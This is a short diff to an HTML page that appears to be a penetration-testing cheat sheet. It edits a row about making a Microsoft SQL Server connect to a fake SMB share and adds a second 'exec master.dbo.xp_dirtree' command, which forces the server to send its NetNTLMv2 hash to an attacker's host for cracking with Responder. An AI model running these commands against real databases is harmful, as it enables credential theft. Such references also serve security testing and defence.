@@ -1772,7 +1772,10 @@ layout: default
         </tr>
         <tr>
             <td>Connect to non-existing SMB server from mssql</td>
-            <td>xp_dirtree '\\&lt;ip address&gt;\&lt;fake share name&gt;'</td>
+            <td>
+                <li>xp_dirtree '\\&lt;ip address&gt;\&lt;fake share name&gt;'</li>
+                <li>exec master.dbo.xp_dirtree &quot;\\&lt;ip address&gt;\test&quot;</li>
+            </td>
         </tr>
         <tr>
             <td>Crack the NetNTLMv2 output hash on Kali responder</td>
